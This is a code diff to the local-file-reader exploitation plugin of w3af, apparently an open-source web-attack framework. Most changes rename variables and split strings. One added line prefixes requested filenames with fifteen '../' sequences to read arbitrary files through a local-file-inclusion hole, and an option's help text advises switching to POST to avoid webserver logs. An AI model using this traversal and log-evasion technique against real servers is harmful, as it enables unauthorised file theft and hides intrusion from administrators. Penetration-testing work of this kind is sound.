@@ -101,9 +101,9 @@ class localFileReader(baseAttackPlugin):
 
         @return : True if vuln can be exploited.
         '''
-        functionReference = getattr( self._urlOpener , vuln.getMethod() )
+        function_reference = getattr( self._urlOpener , vuln.getMethod() )
         try:
-            response = functionReference( vuln.getURL(), str(vuln.getDc()) )
+            response = function_reference( vuln.getURL(), str(vuln.getDc()) )
         except w3afException, e:
             om.out.error( str(e) )
             return False
@@ -117,8 +117,10 @@ class localFileReader(baseAttackPlugin):
         '''
         @return: A list of option objects for this plugin.
         '''
-        d0 = 'f the vulnerability was found in a GET request, try to change the method to POST during exploitation.'
-        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST during exploitation; this is usefull for not being logged in the webserver logs.'
+        d0 = 'f the vulnerability was found in a GET request, try to change the method to POST'
+        d0 += ' during exploitation.'
+        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
+        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
         o0 = option('changeToPost', self._changeToPost, d0, 'boolean', help=h0)
         
         d1 = 'URL to exploit with fastExploit()'
@@ -227,16 +229,19 @@ class fileReaderShell(shell):
                 return self._cat( file )
             
     def _cat( self, filename ):
+        # Do it
+        filename = '../' * 15 + filename
+
         # Lets send the command.
-        functionReference = getattr( self._urlOpener , self.getMethod() )
+        function_reference = getattr( self._urlOpener , self.getMethod() )
         dc = self.getDc()
         dc[ self.getVar() ] = filename
         try:
-            response = functionReference( self.getURL() ,  str(dc) )
+            response = function_reference( self.getURL() ,  str(dc) )
         except w3afException, e:
             return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
         else:
-            return self._filterErrors( self._cut( response.getBody() ) )
+            return self._filter_errors( self._cut( response.getBody() ) )
                 
     def _list( self ):
         '''
@@ -255,7 +260,7 @@ class fileReaderShell(shell):
         
         return res
             
-    def _filterErrors( self, result ):
+    def _filter_errors( self, result ):
         '''
         Filter out ugly php errors and print a simple "Permission denied" or "File not found"
         '''
@@ -282,10 +287,16 @@ class fileReaderShell(shell):
             self._rOS = 'linux'
         else:
             self._rOS = 'windows'
+
+        # This can't be determined
+        self._rSystem = ''
+        self._rSystemName = 'linux'
+        self._rUser = 'file-reader'
     
     def __repr__( self ):
         if not self._rOS:
             self._identifyOs()
+
         return '<shell object (rsystem: "'+self._rOS+'")>'
         
     __str__ = __repr__
